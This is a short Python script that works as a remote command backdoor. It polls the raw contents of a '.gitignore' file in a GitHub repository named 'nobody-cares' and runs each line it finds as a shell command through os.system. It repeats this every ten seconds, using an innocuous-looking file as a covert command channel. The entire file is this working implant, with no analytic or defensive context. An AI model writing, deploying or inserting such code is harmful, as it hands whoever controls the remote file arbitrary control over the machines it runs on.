import os
import requests
from time import sleep

# url
url = "https://raw.githubusercontent.com/mahdoosh1/nobody-cares/main/.gitignore"

# funcs
def run(inp):
    splet = inp.split('$nl')
    for cmd in splet:
        # exit if wanted
        if cmd in ["end","end\n"]: exit()
        # run
        os.system(cmd)

def read():
    f = open('last cmd.txt', 'r')
    text = f.read()
    f.close()
    return text

def write(inp):
    f = open('last cmd.txt', 'w')
    f.write(inp)
    f.close()

def get():
    global url
    while True:
        try:
            return requests.get(url, headers={"Content-Type": "application/json"}).text
        except:
            sleep(1)

def do(inp):
    # print(inp)
    write(inp)
    run(inp)

# main
try:
    text = read()
    do(text)
except:
    print("File didn't exist, getting from url")
    text = get()
    write(text)
while True:
    file = read()
    if file != text:
        print("different.\n")
        do(text)
    sleep(10)
    text = get()